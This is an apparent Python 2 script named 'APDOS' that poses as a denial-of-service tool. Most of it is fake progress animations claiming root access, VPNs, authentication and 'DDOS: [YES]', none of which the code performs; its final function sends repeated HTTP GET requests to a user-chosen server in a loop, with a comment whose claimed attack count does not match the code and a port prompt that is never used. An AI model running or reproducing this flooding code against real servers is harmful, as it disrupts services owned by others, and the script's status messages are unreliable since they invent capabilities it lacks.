import socket, sys, os, time, itertools, threading

print "-=-+- -+-=- -=-+- -+-=-"
print "       - APDOS -       "
print "-=-+- -+-=- -=-+- -+-=-"
server = raw_input("SERVER: ")
port = raw_input("PORT: ")
type = raw_input("PAYLOAD: ")
print "-+--=- " + server  + " -=--+-"
print "-+--=- " + type + " -=--+-"
# -+--=- -=--+- #

done = False
#here is the animation
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rLocating         ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rLocating    [COMPLETE]\n     ')

t = threading.Thread(target=animate)
t.start()

#long process here
time.sleep(5)
done = True

done1 = False
#here is the animation
def animate():
    for d in itertools.cycle(['|', '/', '-', '\\']):
        if done1:
            break
        sys.stdout.write('\rConnecting       ' + d)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rConnecting  [COMPLETE]\n     ')

t = threading.Thread(target=animate)
t.start()

#long process here
time.sleep(5)
done1 = True

done2 = False
#here is the animation
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done2:
            break
        sys.stdout.write('\rTurning On       ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rTurning On  [COMPLETE]\n     ')

t = threading.Thread(target=animate)
t.start()

#long process here
time.sleep(3)
done2 = True

done = False
#here is the animation
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rBooting          ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rBooting     [COMPLETE]\n     ')

t = threading.Thread(target=animate)
t.start()

#long process here
time.sleep(5)
done = True

done1 = False
#here is the animation
def animate():
    for d in itertools.cycle(['|', '/', '-', '\\']):
        if done1:
            break
        sys.stdout.write('\rROOT:    ' + d)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rROOT:  [YES]\n')

t = threading.Thread(target=animate)
t.start()

#long process here
time.sleep(2)
done1 = True

# Boots

donea = False
#here is the animation
def animate():
    for d in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rVPNS:    ' + d)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rVPNS:  [YES]\n     ')

t = threading.Thread(target=animate)
t.start()

#long process here
time.sleep(2)
donea = True

donea = False
#here is the animation
def animate():
    for d in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rAUTH:    ' + d)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rAUTH:  [YES]\n     ')

t = threading.Thread(target=animate)
t.start()

#long process here
time.sleep(2)
donea = True

donea = False
#here is the animation
def animate():
    for d in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rDDOS:    ' + d)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rDDOS:  [YES]\n     ')

t = threading.Thread(target=animate)
t.start()

#long process here
time.sleep(2)
done = True

donea = False
#here is the animation
def animate():
    for d in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rHTTP:    ' + d)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rHTTP:  [YES]\n     ')

t = threading.Thread(target=animate)
t.start()

#long process here
time.sleep(2)
donea = True

done = False
#here is the animation
def animate():
    for e in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rSTARTING:    ' + e)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rSTARTING: [FAILURE!]\n     ')

t = threading.Thread(target=animate)
t.start()

#long process here
time.sleep(2)
done = True
time.sleep(3)
done4 = False
#here is the animation
def animate1():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rJK:    ' + c)
        sys.stdout.flush()
        time.sleep(0.2)
    sys.stdout.write('\rJK: [STARTING]\n')

t = threading.Thread(target=animate1)
t.start()

#long process here
time.sleep(2)
done4 = True

# -+--=- -=--+- #
def attack():  
    #pid = os.fork()  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    s.connect((server, 80))  
    print ">> GET /" + type + " HTTP/1.1"  
    s.send("GET /" + type + " HTTP/1.1\r\n")  
    s.send("Host: " + server  + "\r\n\r\n");  
    s.close()
# 10,000 = Attack Amount
for i in range(1, 100):
    attack()
print "-=-+- -+-=-  -=-+- -+-=-"
print "   - APDOS COMPLETE -   "
print "-=-+- -+-=-  -=-+- -+-=-"
